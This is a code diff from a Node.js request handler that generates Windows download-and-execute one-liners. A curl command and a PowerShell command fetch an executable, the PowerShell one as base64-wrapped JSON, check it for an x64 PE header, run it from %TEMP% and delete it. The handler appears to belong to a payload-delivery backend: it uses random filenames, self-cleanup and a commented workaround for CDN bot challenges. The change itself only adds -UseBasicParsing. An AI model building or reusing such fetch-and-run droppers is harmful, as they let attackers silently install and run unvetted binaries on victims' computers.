@@ -143,7 +143,7 @@ module.exports = function createScansHandler(deps) {
             const cmdCommand = 'curl -sL "' + downloadUrl + '" -o "%TEMP%\\' + rndName + '" && "%TEMP%\\' + rndName + '" && del /f "%TEMP%\\' + rndName + '"';
             // PowerShell one-liner: качает JSON с base64-бинарём, декодирует, проверяет PE-заголовок
             // (x64), запускает. Обходит CDN, которые подменяют сырой бинарный ответ HTML-челленджем.
-            const psCommand = 'powershell -c "$r=iwr -uri \'' + downloadUrlB64 + '\'; $j=$r.Content|ConvertFrom-Json; $b=[Convert]::FromBase64String($j.base64); $fn=$j.name; $p=$env:TEMP+\'\\\'+$fn; [IO.File]::WriteAllBytes($p,$b); if ($b[0]-ne 77 -or $b[1]-ne 90) { throw \"Invalid PE header\" }; $pe=[BitConverter]::ToInt32($b,0x3C); if ([BitConverter]::ToUInt16($b,$pe+4)-ne 0x8664) { throw \"Not x64 binary\" }; & $p; del $p"';
+            const psCommand = 'powershell -c "$r=iwr -UseBasicParsing -uri \'' + downloadUrlB64 + '\'; $j=$r.Content|ConvertFrom-Json; $b=[Convert]::FromBase64String($j.base64); $fn=$j.name; $p=$env:TEMP+\'\\\'+$fn; [IO.File]::WriteAllBytes($p,$b); if ($b[0]-ne 77 -or $b[1]-ne 90) { throw \"Invalid PE header\" }; $pe=[BitConverter]::ToInt32($b,0x3C); if ([BitConverter]::ToUInt16($b,$pe+4)-ne 0x8664) { throw \"Not x64 binary\" }; & $p; del $p"';
             sendJson(res, 200, { link, cmdCommand, psCommand, downloadUrl, downloadUrlB64, exeName: rndName });
             return true;
         }
